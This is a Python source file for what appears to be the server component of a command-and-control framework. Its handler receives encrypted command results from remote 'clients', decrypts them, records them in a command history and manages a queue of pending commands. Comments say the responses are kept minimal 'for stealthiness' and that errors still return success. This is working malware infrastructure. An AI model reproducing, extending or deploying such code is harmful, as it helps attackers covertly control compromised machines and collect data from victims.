import json
import logging
import base64
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class ResultHandler(BaseHandler):
    """Handler for command result data from clients"""
    
    def handle(self):
        """Process command result data from client"""
        # Get content data
        self.log_message(f"ResultHandler received request from {self.client_address[0]}")
        
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.log_message(f"Missing content from {self.client_address[0]}")
            self.send_error_response(400, "Missing content")
            return
            
        self.log_message(f"Reading {content_length} bytes of result data")
        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        try:
            # Parse the request body JSON
            body_data = json.loads(request_body)
            
            # Get encrypted data
            encrypted_data = body_data.get('data')
            
            if not encrypted_data:
                self.log_message(f"No data provided in request from {self.client_address[0]}")
                self.send_error_response(400, "Missing data")
                return
                
            # For backward compatibility - if client_id is provided
            provided_client_id = body_data.get('client_id')
            
            # Identify client by key-based decryption
            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
            
            # If decryption-based ID failed but client_id was provided
            if client_id is None and provided_client_id:
                client_id = provided_client_id
                self.log_message(f"Using provided client ID: {client_id} due to decryption failure")
                
                # Try decryption with the provided client ID
                try:
                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                except Exception as e:
                    self.log_message(f"Decryption failed with provided client ID: {e}")
            
            if client_id is None and decrypted_data is None:
                self.log_message(f"Could not identify client - authentication failed")
                self.send_error_response(400, "Authentication failed")
                return
                
            self.log_message(f"Identified client from result: {client_id}")
            
            # Process the result
            try:
                result_data = decrypted_data
                is_structured = False
                timestamp = None
                result = None
                
                # Try to parse as JSON
                try:
                    if result_data:
                        result_json = json.loads(result_data)
                        if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                            # This is a structured result
                            is_structured = True
                            timestamp = result_json['timestamp']
                            result = result_json['result']
                except json.JSONDecodeError:
                    # Not JSON, use as raw result
                    self.log_message(f"Data is not valid JSON, using as raw result")
                    result = result_data
                
                # Process structured result if parsed successfully
                if is_structured and timestamp and result:
                    self.log_message(f"Processing structured result for timestamp {timestamp}")
                    
                    # Add the result to the command history
                    success = self.client_manager.add_command_result(client_id, timestamp, result)
                    self.log_message(f"Result processed for client {client_id} (timestamp: {timestamp}), success: {success}")
                    
                    # Remove the command from pending queue since we have the result
                    self._remove_from_pending(client_id, timestamp)
                else:
                    # Handle unstructured result or fallbacks
                    self._handle_unstructured_result(client_id, result_data)
                
                # Send success response - simplified to just a standard "OK" for stealthiness
                self.send_success_response()
                
            except Exception as e:
                logger.error(f"Error processing command result: {e}")
                # Still send a success response to prevent client from retrying endlessly
                self.send_success_response()
                
        except json.JSONDecodeError:
            self.log_message(f"Invalid JSON in request body from {self.client_address[0]}")
            self.send_error_response(400, "Invalid JSON format")
    
    def _remove_from_pending(self, client_id, timestamp):
        """Remove a command from pending once its result is received"""
        if client_id in self.client_manager.get_clients_info():
            pending_commands = self.client_manager.get_pending_commands(client_id)
            # Find and remove the command with matching timestamp
            for i, cmd in enumerate(pending_commands):
                if cmd.get("timestamp") == timestamp:
                    # Remove this specific command from pending
                    self.log_message(f"Removing completed command with timestamp {timestamp} from pending for client {client_id}")
                    self.client_manager.clear_pending_commands(client_id)
                    
                    # Re-add any other pending commands that weren't completed
                    for j, other_cmd in enumerate(pending_commands):
                        if j != i:
                            self.client_manager.add_command(
                                client_id,
                                other_cmd.get("command_type", "unknown"),
                                other_cmd.get("args", "")
                            )
                    break
    
    def _handle_unstructured_result(self, client_id, result_data):
        """Handle unstructured (non-JSON) command results"""
        self.log_message(f"Unstructured result received from {client_id}")
        self.client_manager.log_event(client_id, "Command Result Received", result_data)